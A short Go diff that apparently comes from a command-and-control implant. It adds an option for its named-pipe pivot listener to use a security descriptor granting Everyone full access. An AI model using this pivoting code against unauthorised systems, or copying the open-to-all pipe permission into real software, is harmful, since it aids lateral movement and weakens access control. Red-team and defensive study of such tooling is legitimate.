@@ -31,17 +31,25 @@ import (
 	"github.com/lesnuages/go-winio"
 )
 
+const PipeAllowAllAccess = 0
+
 var (
 	namedpipePivotReadDeadline  = 10 * time.Second
 	namedpipePivotWriteDeadline = 10 * time.Second
 )
 
 // CreateNamedPipePivotListener - Starts a named pipe listener
-func CreateNamedPipePivotListener(address string, upstream chan<- *pb.Envelope) (*PivotListener, error) {
+func CreateNamedPipePivotListener(address string, upstream chan<- *pb.Envelope, opts ...bool) (*PivotListener, error) {
 	fullName := "\\\\.\\pipe\\" + strings.TrimPrefix(address, "\\\\.\\pipe\\")
+	sd := ""
+	if len(opts) > 0 {
+		if opts[PipeAllowAllAccess] {
+			sd = "D:(A;;0x1f019f;;;WD)" // open to all
+		}
+	}
 	ln, err := winio.ListenPipe(fullName, &winio.PipeConfig{
-		//SecurityDescriptor: "",
-		RemoteClientMode: true,
+		SecurityDescriptor: sd,
+		RemoteClientMode:   true,
 	})
 	// {{if .Config.Debug}}
 	log.Printf("Listening on named pipe %s", fullName)
@@ -56,6 +64,7 @@ func CreateNamedPipePivotListener(address string, upstream chan<- *pb.Envelope) 
 		PivotConnections: &sync.Map{},
 		BindAddress:      fullName,
 		Upstream:         upstream,
+		Options:          opts,
 	}
 	go namedPipeAcceptConnections(pivotLn)
 	return pivotLn, nil
